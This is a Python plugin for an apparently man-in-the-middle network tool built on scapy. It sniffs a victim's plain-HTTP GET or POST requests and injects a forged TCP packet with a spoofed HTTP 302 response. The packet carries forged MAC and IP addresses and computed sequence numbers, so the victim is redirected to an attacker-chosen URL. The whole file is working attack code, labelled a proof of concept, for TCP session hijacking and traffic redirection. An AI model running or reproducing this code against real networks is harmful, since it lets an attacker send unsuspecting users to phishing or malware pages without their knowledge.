from .base import PacketPlugin
from scapy.all import IP, TCP, Raw, sendp, Ether

class HttpRedirectPlugin(PacketPlugin):
    def __init__(self):
        self.redirect_url = None
        
    def register_args(self, parser):
        parser.add_argument("--redirect-url", help="HTTP URL to redirect victim to (HTTP only POC)")

    def configure(self, args):
        self.redirect_url = args.redirect_url

    def _send_http_redirect(self, victim_pkt: IP, redirect_url: str, ctx: dict) -> None:
        """
        Spoof an HTTP 302 redirect response to the victim.
        """
        try:
            v_ip = victim_pkt[IP]
            v_tcp = victim_pkt[TCP]

            payload_len = len(v_tcp.payload)
            if payload_len == 0:
                return

            new_seq = v_tcp.ack
            new_ack = v_tcp.seq + payload_len

            # Construct HTTP 302 response
            http_response = (
                "HTTP/1.1 302 Found\r\n"
                f"Location: {redirect_url}\r\n"
                "Content-Length: 0\r\n"
                "Connection: close\r\n"
                "\r\n"
            )

            spoofed_pkt = (
                Ether(src=ctx["attacker_mac"], dst=ctx["victim_mac"]) /
                IP(src=v_ip.dst, dst=v_ip.src) /
                TCP(sport=v_tcp.dport, dport=v_tcp.sport,
                    seq=new_seq, ack=new_ack, flags="PA") /
                http_response
            )
            
            sendp(spoofed_pkt, iface=ctx["iface"], verbose=False)

        except Exception as e:
            print(f"[!] redirect exception: {e}")

    def process_packet(self, ip_pkt: IP, ctx: dict) -> bool:
        if self.redirect_url and ip_pkt.haslayer(TCP) and ip_pkt[TCP].dport == 80:
             # Check for HTTP GET
             if ip_pkt.haslayer(Raw):
                 payload = ip_pkt[Raw].load
                 if b"GET" in payload or b"POST" in payload:
                     print(f"[REDIRECT] Hijacking HTTP request from {ip_pkt.src} -> {self.redirect_url}")
                     self._send_http_redirect(ip_pkt, self.redirect_url, ctx)
                     return True
        return False
